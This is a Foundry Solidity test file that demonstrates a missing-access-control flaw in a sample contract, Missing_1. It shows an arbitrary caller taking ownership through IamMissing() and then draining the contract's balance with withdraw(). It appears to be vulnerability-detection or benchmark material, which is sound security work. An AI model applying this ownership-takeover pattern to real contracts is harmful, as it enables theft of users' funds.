
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_1} from "../src/Missing_1.sol";

contract TestAccessControlMissing_1 is Test {
    Missing_1 private target;
    address private initialOwner;

    function setUp() public {
        initialOwner = address(0xBEEF);
        
        vm.prank(initialOwner);
        target = new Missing_1();
        
        vm.prank(initialOwner);
        target.IamMissing();
        
        vm.deal(address(target), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the initial owner who legitimately set themselves as owner
        vm.assume(caller != initialOwner);

        // --- 2. State Configuration ---
        // Fund the caller in case needed
        vm.deal(caller, 1 ether);

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // Call the vulnerable IamMissing function which lacks access control
        // This allows any arbitrary user to become the owner
        target.IamMissing();

        // Now verify the caller can withdraw funds (proving they became owner)
        uint256 contractBalanceBefore = address(target).balance;
        uint256 callerBalanceBefore = caller.balance;
        
        vm.prank(caller);
        target.withdraw();
        
        // Assert the caller successfully withdrew the contract's funds
        assertEq(address(target).balance, 0, "Contract should have 0 balance after withdrawal");
        assertEq(caller.balance, callerBalanceBefore + contractBalanceBefore, "Caller should have received the contract's balance");
    }
}
